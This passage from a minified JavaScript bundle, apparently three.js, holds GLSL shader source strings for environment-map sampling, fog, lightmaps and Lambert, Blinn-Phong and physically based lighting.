sampleUV;\n\n\t\treflectVec = normalize( reflectVec );\n\n\t\tsampleUV.y = asin( clamp( reflectVec.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\n\t\tsampleUV.x = atan( reflectVec.z, reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\n\n\t\tvec4 envColor = texture2D( envMap, sampleUV );\n\n\t#elif defined( ENVMAP_TYPE_SPHERE )\n\n\t\treflectVec = normalize( reflectVec );\n\n\t\tvec3 reflectView = normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0, 0.0, 1.0 ) );\n\n\t\tvec4 envColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5 );\n\n\t#else\n\n\t\tvec4 envColor = vec4( 0.0 );\n\n\t#endif\n\n\tenvColor = envMapTexelToLinear( envColor );\n\n\t#ifdef ENVMAP_BLENDING_MULTIPLY\n\n\t\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\n\n\t#elif defined( ENVMAP_BLENDING_MIX )\n\n\t\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\n\n\t#elif defined( ENVMAP_BLENDING_ADD )\n\n\t\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\n\n\t#endif\n\n#endif\n",envmap_pars_fragment:"\n#if defined( USE_ENVMAP ) || defined( PHYSICAL )\n\tuniform float reflectivity;\n\tuniform float envMapIntensity;\n#endif\n\n#ifdef USE_ENVMAP\n\n\t#if ! defined( PHYSICAL ) && ( defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) )\n\t\tvarying vec3 vWorldPosition;\n\t#endif\n\n\t#ifdef ENVMAP_TYPE_CUBE\n\t\tuniform samplerCube envMap;\n\t#else\n\t\tuniform sampler2D envMap;\n\t#endif\n\tuniform float flipEnvMap;\n\tuniform int maxMipLevel;\n\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( PHYSICAL )\n\t\tuniform float refractionRatio;\n\t#else\n\t\tvarying vec3 vReflect;\n\t#endif\n\n#endif\n",envmap_pars_vertex:"\n#ifdef USE_ENVMAP\n\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\n\t\tvarying vec3 vWorldPosition;\n\n\t#else\n\n\t\tvarying vec3 vReflect;\n\t\tuniform float refractionRatio;\n\n\t#endif\n\n#endif\n",envmap_physical_pars_fragment:"\n#if defined( USE_ENVMAP ) && defined( PHYSICAL )\n\n\tvec3 getLightProbeIndirectIrradiance(  const in GeometricContext geometry, const in int maxMIPLevel ) {\n\n\t\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\n\n\t\t#ifdef ENVMAP_TYPE_CUBE\n\n\t\t\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\n\n\t\t\t// TODO: replace with properly filtered cubemaps and access the irradiance LOD level, be it the last LOD level\n\t\t\t// of a specular cubemap, or just the default level of a specially created irradiance cubemap.\n\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\n\t\t\t\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\n\n\t\t\t#else\n\n\t\t\t\t// force the bias high to get the last LOD level as it is the most blurred.\n\t\t\t\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\n\n\t\t\t#endif\n\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\n\t\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\n\t\t\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, queryVec, 1.0 );\n\n\t\t#else\n\n\t\t\tvec4 envMapColor = vec4( 0.0 );\n\n\t\t#endif\n\n\t\treturn PI * envMapColor.rgb * envMapIntensity;\n\n\t}\n\n\t// taken from here: http://casual-effects.blogspot.ca/2011/08/plausible-environment-lighting-in-two.html\n\tfloat getSpecularMIPLevel( const in float blinnShininessExponent, const in int maxMIPLevel ) {\n\n\t\t//float envMapWidth = pow( 2.0, maxMIPLevelScalar );\n\t\t//float desiredMIPLevel = log2( envMapWidth * sqrt( 3.0 ) ) - 0.5 * log2( pow2( blinnShininessExponent ) + 1.0 );\n\n\t\tfloat maxMIPLevelScalar = float( maxMIPLevel );\n\t\tfloat desiredMIPLevel = maxMIPLevelScalar + 0.79248 - 0.5 * log2( pow2( blinnShininessExponent ) + 1.0 );\n\n\t\t// clamp to allowable LOD ranges.\n\t\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\n\n\t}\n\n\tvec3 getLightProbeIndirectRadiance(  const in GeometricContext geometry, const in float blinnShininessExponent, const in int maxMIPLevel ) {\n\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\n\t\t\tvec3 reflectVec = reflect( -geometry.viewDir, geometry.normal );\n\n\t\t#else\n\n\t\t\tvec3 reflectVec = refract( -geometry.viewDir, geometry.normal, refractionRatio );\n\n\t\t#endif\n\n\t\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\n\n\t\tfloat specularMIPLevel = getSpecularMIPLevel( blinnShininessExponent, maxMIPLevel );\n\n\t\t#ifdef ENVMAP_TYPE_CUBE\n\n\t\t\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\n\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\n\t\t\t\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\n\n\t\t\t#else\n\n\t\t\t\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\n\n\t\t\t#endif\n\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\n\t\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\n\t\t\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, queryReflectVec, BlinnExponentToGGXRoughness(blinnShininessExponent ));\n\n\t\t#elif defined( ENVMAP_TYPE_EQUIREC )\n\n\t\t\tvec2 sampleUV;\n\t\t\tsampleUV.y = asin( clamp( reflectVec.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\t\t\tsampleUV.x = atan( reflectVec.z, reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\n\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\n\t\t\t\tvec4 envMapColor = texture2DLodEXT( envMap, sampleUV, specularMIPLevel );\n\n\t\t\t#else\n\n\t\t\t\tvec4 envMapColor = texture2D( envMap, sampleUV, specularMIPLevel );\n\n\t\t\t#endif\n\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\n\t\t#elif defined( ENVMAP_TYPE_SPHERE )\n\n\t\t\tvec3 reflectView = normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0,0.0,1.0 ) );\n\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\n\t\t\t\tvec4 envMapColor = texture2DLodEXT( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\n\n\t\t\t#else\n\n\t\t\t\tvec4 envMapColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\n\n\t\t\t#endif\n\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\n\t\t#endif\n\n\t\treturn envMapColor.rgb * envMapIntensity;\n\n\t}\n\n#endif\n",envmap_vertex:"\n#ifdef USE_ENVMAP\n\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\n\n\t\tvWorldPosition = worldPosition.xyz;\n\n\t#else\n\n\t\tvec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\n\n\t\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\n\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\n\t\t\tvReflect = reflect( cameraToVertex, worldNormal );\n\n\t\t#else\n\n\t\t\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\n\n\t\t#endif\n\n\t#endif\n\n#endif\n",fog_vertex:"\n#ifdef USE_FOG\n\n\tfogDepth = -mvPosition.z;\n\n#endif\n",fog_pars_vertex:"\n#ifdef USE_FOG\n\n\tvarying float fogDepth;\n\n#endif\n",fog_fragment:"\n#ifdef USE_FOG\n\n\t#ifdef FOG_EXP2\n\n\t\tfloat fogFactor = whiteCompliment( exp2( - fogDensity * fogDensity * fogDepth * fogDepth * LOG2 ) );\n\n\t#else\n\n\t\tfloat fogFactor = smoothstep( fogNear, fogFar, fogDepth );\n\n\t#endif\n\n\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\n\n#endif\n",fog_pars_fragment:"\n#ifdef USE_FOG\n\n\tuniform vec3 fogColor;\n\tvarying float fogDepth;\n\n\t#ifdef FOG_EXP2\n\n\t\tuniform float fogDensity;\n\n\t#else\n\n\t\tuniform float fogNear;\n\t\tuniform float fogFar;\n\n\t#endif\n\n#endif\n",gradientmap_pars_fragment:"\n#ifdef TOON\n\n\tuniform sampler2D gradientMap;\n\n\tvec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {\n\n\t\t// dotNL will be from -1.0 to 1.0\n\t\tfloat dotNL = dot( normal, lightDirection );\n\t\tvec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );\n\n\t\t#ifdef USE_GRADIENTMAP\n\n\t\t\treturn texture2D( gradientMap, coord ).rgb;\n\n\t\t#else\n\n\t\t\treturn ( coord.x < 0.7 ) ? vec3( 0.7 ) : vec3( 1.0 );\n\n\t\t#endif\n\t}\n\n#endif\n",lightmap_fragment:"\n#ifdef USE_LIGHTMAP\n\n\treflectedLight.indirectDiffuse += PI * texture2D( lightMap, vUv2 ).xyz * lightMapIntensity; // factor of PI should not be present; included here to prevent breakage\n\n#endif\n",lightmap_pars_fragment:"\n#ifdef USE_LIGHTMAP\n\n\tuniform sampler2D lightMap;\n\tuniform float lightMapIntensity;\n\n#endif\n",lights_lambert_vertex:"\nvec3 diffuse = vec3( 1.0 );\n\nGeometricContext geometry;\ngeometry.position = mvPosition.xyz;\ngeometry.normal = normalize( transformedNormal );\ngeometry.viewDir = normalize( -mvPosition.xyz );\n\nGeometricContext backGeometry;\nbackGeometry.position = geometry.position;\nbackGeometry.normal = -geometry.normal;\nbackGeometry.viewDir = geometry.viewDir;\n\nvLightFront = vec3( 0.0 );\nvIndirectFront = vec3( 0.0 );\n\n#ifdef DOUBLE_SIDED\n\tvLightBack = vec3( 0.0 );\n\tvIndirectBack = vec3( 0.0 );\n#endif\n\nIncidentLight directLight;\nfloat dotNL;\nvec3 directLightColor_Diffuse;\n\n#if NUM_POINT_LIGHTS > 0\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\n\t\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\n\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\n\t\t#ifdef DOUBLE_SIDED\n\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\n\t\t#endif\n\n\t}\n\n#endif\n\n#if NUM_SPOT_LIGHTS > 0\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\n\t\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\n\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\n\t\t#ifdef DOUBLE_SIDED\n\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\n\t\t#endif\n\t}\n\n#endif\n#if NUM_DIR_LIGHTS > 0\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\n\t\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\n\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\n\t\t#ifdef DOUBLE_SIDED\n\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\n\t\t#endif\n\n\t}\n\n#endif\n\n#if NUM_HEMI_LIGHTS > 0\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\n\t\tvIndirectFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\n\n\t\t#ifdef DOUBLE_SIDED\n\n\t\t\tvIndirectBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\n\n\t\t#endif\n\n\t}\n\n#endif\n",lights_pars_begin:"\nuniform vec3 ambientLightColor;\n\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\n\n\tvec3 irradiance = ambientLightColor;\n\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\n\t\tirradiance *= PI;\n\n\t#endif\n\n\treturn irradiance;\n\n}\n\n#if NUM_DIR_LIGHTS > 0\n\n\tstruct DirectionalLight {\n\t\tvec3 direction;\n\t\tvec3 color;\n\n\t\tint shadow;\n\t\tfloat shadowBias;\n\t\tfloat shadowRadius;\n\t\tvec2 shadowMapSize;\n\t};\n\n\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\n\n\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\n\t\tdirectLight.color = directionalLight.color;\n\t\tdirectLight.direction = directionalLight.direction;\n\t\tdirectLight.visible = true;\n\n\t}\n\n#endif\n#if NUM_POINT_LIGHTS > 0\n\n\tstruct PointLight {\n\t\tvec3 position;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\n\t\tint shadow;\n\t\tfloat shadowBias;\n\t\tfloat shadowRadius;\n\t\tvec2 shadowMapSize;\n\t\tfloat shadowCameraNear;\n\t\tfloat shadowCameraFar;\n\t};\n\n\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\n\n\t// directLight is an out parameter as having it as a return value caused compiler errors on some devices\n\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\n\t\tvec3 lVector = pointLight.position - geometry.position;\n\t\tdirectLight.direction = normalize( lVector );\n\n\t\tfloat lightDistance = length( lVector );\n\n\t\tdirectLight.color = pointLight.color;\n\t\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\n\t\tdirectLight.visible = ( directLight.color != vec3( 0.0 ) );\n\n\t}\n\n#endif\n#if NUM_SPOT_LIGHTS > 0\n\n\tstruct SpotLight {\n\t\tvec3 position;\n\t\tvec3 direction;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\t\tfloat coneCos;\n\t\tfloat penumbraCos;\n\n\t\tint shadow;\n\t\tfloat shadowBias;\n\t\tfloat shadowRadius;\n\t\tvec2 shadowMapSize;\n\t};\n\n\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\n\n\t// directLight is an out parameter as having it as a return value caused compiler errors on some devices\n\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight  ) {\n\n\t\tvec3 lVector = spotLight.position - geometry.position;\n\t\tdirectLight.direction = normalize( lVector );\n\n\t\tfloat lightDistance = length( lVector );\n\t\tfloat angleCos = dot( directLight.direction, spotLight.direction );\n\n\t\tif ( angleCos > spotLight.coneCos ) {\n\n\t\t\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\n\n\t\t\tdirectLight.color = spotLight.color;\n\t\t\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\n\t\t\tdirectLight.visible = true;\n\n\t\t} else {\n\n\t\t\tdirectLight.color = vec3( 0.0 );\n\t\t\tdirectLight.visible = false;\n\n\t\t}\n\t}\n\n#endif\n#if NUM_RECT_AREA_LIGHTS > 0\n\n\tstruct RectAreaLight {\n\t\tvec3 color;\n\t\tvec3 position;\n\t\tvec3 halfWidth;\n\t\tvec3 halfHeight;\n\t};\n\n\t// Pre-computed values of LinearTransformedCosine approximation of BRDF\n\t// BRDF approximation Texture is 64x64\n\tuniform sampler2D ltc_1; // RGBA Float\n\tuniform sampler2D ltc_2; // RGBA Float\n\n\tuniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];\n\n#endif\n#if NUM_HEMI_LIGHTS > 0\n\n\tstruct HemisphereLight {\n\t\tvec3 direction;\n\t\tvec3 skyColor;\n\t\tvec3 groundColor;\n\t};\n\n\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\n\n\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\n\n\t\tfloat dotNL = dot( geometry.normal, hemiLight.direction );\n\t\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\n\n\t\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\n\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\n\t\t\tirradiance *= PI;\n\n\t\t#endif\n\n\t\treturn irradiance;\n\n\t}\n\n#endif\n",lights_phong_fragment:"\nBlinnPhongMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb;\nmaterial.specularColor = specular;\nmaterial.specularShininess = shininess;\nmaterial.specularStrength = specularStrength;\n",lights_phong_pars_fragment:"\nvarying vec3 vViewPosition;\n\n#ifndef FLAT_SHADED\n\n\tvarying vec3 vNormal;\n\n#endif\nstruct BlinnPhongMaterial {\n\n\tvec3\tdiffuseColor;\n\tvec3\tspecularColor;\n\tfloat\tspecularShininess;\n\tfloat\tspecularStrength;\n\n};\n\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\n\t#ifdef TOON\n\n\t\tvec3 irradiance = getGradientIrradiance( geometry.normal, directLight.direction ) * directLight.color;\n\n\t#else\n\n\t\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\n\t\tvec3 irradiance = dotNL * directLight.color;\n\n\t#endif\n\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\n\t\tirradiance *= PI; // punctual light\n\n\t#endif\n\n\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n\n\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\n\n}\n\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n\n}\n\n#define RE_Direct\t\t\t\tRE_Direct_BlinnPhong\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_BlinnPhong\n\n#define Material_LightProbeLOD( material )\t(0)\n",lights_physical_fragment:"\nPhysicalMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\nmaterial.specularRoughness = clamp( roughnessFactor, 0.04, 1.0 );\n#ifdef STANDARD\n\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\n#else\n\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\n\tmaterial.clearCoat = saturate( clearCoat ); // Burley clearcoat model\n\tmaterial.clearCoatRoughness = clamp( clearCoatRoughness, 0.04, 1.0 );\n#endif\n",lights_physical_pars_fragment:"\nstruct PhysicalMaterial {\n\n\tvec3\tdiffuseColor;\n\tfloat\tspecularRoughness;\n\tvec3\tspecularColor;\n\n\t#ifndef STANDARD\n\t\tfloat clearCoat;\n\t\tfloat clearCoatRoughness;\n\t#endif\n\n};\n\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\n\n// Clear coat directional hemishperical reflectance (this approximation should be improved)\nfloat clearCoatDHRApprox( const in float roughness, const in float dotNL ) {\n\n\treturn DEFAULT_SPECULAR_COEFFICIENT + ( 1.0 - DEFAULT_SPECULAR_COEFFICIENT ) * ( pow( 1.0 - dotNL, 5.0 ) * pow( 1.0 - roughness, 2.0 ) );\n\n}\n\n#if NUM_RECT_AREA_LIGHTS > 0\n\n\tvoid RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\n\t\tvec3 normal = geometry.normal;\n\t\tvec3 viewDir = geometry.viewDir;\n\t\tvec3 position = geometry.position;\n\t\tvec3 lightPos = rectAreaLight.position;\n\t\tvec3 halfWidth = rectAreaLight.halfWidth;\n\t\tvec3 halfHeight = rectAreaLight.halfHeight;\n\t\tvec3 lightColor = rectAreaLight.color;\n\t\tfloat roughness = material.specularRoughness;\n\n\t\tvec3 rectCoords[ 4 ];\n\t\trectCoords[ 0 ] = lightPos + halfWidth - halfHeight; // counterclockwise; light shines in local neg z direction\n\t\trectCoords[ 1 ] = lightPos - halfWidth - halfHeight;\n\t\trectCoords[ 2 ] = lightPos - halfWidth + halfHeight;\n\t\trectCoords[ 3 ] = lightPos + halfWidth + halfHeight;\n\n\t\tvec2 uv = LTC_Uv( normal, viewDir, roughness );\n\n\t\tvec4 t1 = texture2D( ltc_1, uv );\n\t\tvec4 t2 = texture2D( ltc_2, uv );\n\n\t\tmat3 mInv = mat3(\n\t\t\tvec3( t1.x, 0, t1.y ),\n\t\t\tvec3(    0, 1,    0 ),\n\t\t\tvec3( t1.z, 0, t1.w )\n\t\t);\n\n\t\t// LTC Fresnel Approximation by Stephen Hill\n\t\t// http://blog.selfshadow.com/publications/s2016-advances/s2016_ltc_fresnel.pdf\n\t\tvec3 fresnel = ( material.specularColor * t2.x + ( vec3( 1.0 ) - material.specularColor ) * t2.y );\n\n\t\treflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );\n\n\t\treflectedLight.directDiffuse += lightColor * material.diffuseColor * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );\n\n\t}\n\n#endif\n\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\n\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\n\n\tvec3 irradiance = dotNL * directLight.color;\n\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\n\t\tirradiance *= PI; // punctual light\n\n\t#endif\n\n\t#ifndef STANDARD\n\t\tfloat clearCoatDHR = material.clearCoat * clearCoatDHRApprox( material.clearCoatRoughness, dotNL );\n\t#else\n\t\tfloat clearCoatDHR = 0.0;\n\t#endif\n\n\treflectedLight.directSpecular += ( 1.0 - clearCoatDHR ) * irradiance * BRDF_Specular_GGX( directLight, geometry, material.specularColor, material.specularRoughness );\n\n\treflectedLight.directDiffuse += ( 1.0 - clearCoatDHR ) * irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n\n\t#ifndef STANDARD\n\n\t\treflectedLight.directSpecular += irradiance * material.clearCoat * BRDF_Specular_GGX( directLight, geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\n\n\t#endif\n\n}\n\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\n\t// Defer to the IndirectSpecular function to compute\n\t// the indirectDiffuse if energy preservation is enabled.\n\t#ifndef ENVMAP_TYPE_CUBE_UV\n\n\t\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n\n\t#endif\n\n}\n\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearCoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {\n\n\t#ifndef STANDARD\n\t\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\t\tfloat dotNL = dotNV;\n\t\tfloat clearCoatDHR = material.clearCoat * clearCoatDHRApprox( material.clearCoatRoughness, dotNL );\n\t#else\n\t\tfloat clearCoatDHR = 0.0;\n\t#endif\n\n\tfloat clearCoatInv = 1.0 - clearCoatDHR;\n\n\t// Both indirect specular and diffuse light accumulate here\n\t// if energy preservation enabled, and PMREM provided.\n\t#if defined( ENVMAP_TYPE_CUBE_UV )\n\n\t\tvec3 singleScattering = vec3( 0.0 );\n\t\tvec3 multiScattering = vec3( 0.0 );\n\t\tvec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;\n\n\t\tBRDF_Specular_Multiscattering_Environment( geometry, material.specularColor, material.specularRoughness, singleScattering, multiScattering );\n\n\t\t// The multiscattering paper uses the below formula for calculating diffuse \n\t\t// for dielectrics, but this is already handled when initially computing the \n\t\t// specular and diffuse color, so we can just use the diffuseColor directly.\n\t\t//vec3 diffuse = material.diffuseColor * ( 1.0 - ( singleScattering + multiScattering ) );\n\t\tvec3 diffuse = material.diffuseColor;\n\n\t\treflectedLight.indirectSpecular += clearCoatInv * radiance * singleScattering;\n\t\treflectedLight.indirectDiffuse += multiScattering * cosineWeightedIrradiance;\n\t\treflectedLight.indirectDiffuse += diffuse * cosineWeightedIrradiance;\n\n\t#else\n\n\t\treflectedLight.indirectSpecular += clearCoatInv * radiance * BRDF_Specular_GGX_Environment( geometry, material.specularColor, material.specularRoughness );\n\n\t#endif\n\n\t#ifndef STANDARD\n\n\t\treflectedLight.indirectSpecular += clearCoatRadiance * material.clearCoat * BRDF_Specular_GGX_Environment( geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\n\n\t#endif\n}\n\n#define RE_Direct\t\t\t\tRE_Direct_Physical\n#define RE_Direct_RectArea\t\tRE_Direct_RectArea_Physical\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_Physical\n#define RE_IndirectSpecular\t\tRE_IndirectSpecular_Physical\n\n#define Material_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.specularRoughness )\n#define Material_ClearCoat_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.clearCoatRoughness )\n\n// ref: https://seblagarde.files.wordpress.com/2015/07/course_notes_moving_frostbite_to_pbr_v32.pdf\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\n\n\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\n\n}\n",lights_fragment_begin:"\nGeometricContext geometry;\n\ngeometry.position = - vViewPosition;\ngeometry.normal = normal;\ngeometry.viewDir = normalize( vViewPosition );\n\nIncidentLight directLight;\n\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\n\n\tPointLight pointLight;\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\n\t\tpointLight = pointLights[ i ];\n\n\t\tgetPointDirectLightIrradiance( pointLight, geometry, directLight );\n\n\t\t#ifdef USE_SHADOWMAP\n\t\tdirectLight.color *= all( bvec2( pointLight.shadow, directLight.visible ) ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;\n\t\t#endif\n\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\n\t}\n\n#endif\n\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\n\n\tSpotLight spotLight;\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\n\t\tspotLight = spotLights[ i ];\n\n\t\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\n\n\t\t#ifdef USE_SHADOWMAP\n\t\tdirectLight.color *= all( bvec2( spotLight.shadow, directLight.visible ) ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\t\t#endif\n\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\n\t}\n\n#endif\n\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\n\n\tDirectionalLight directionalLight;\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\n\t\tdirectionalLight = directionalLights[ i ];\n\n\t\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\n\n\t\t#ifdef USE_SHADOWMAP\n\t\tdirectLight.color *= all( bvec2( directionalLight.shadow, directLight.visible ) ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i 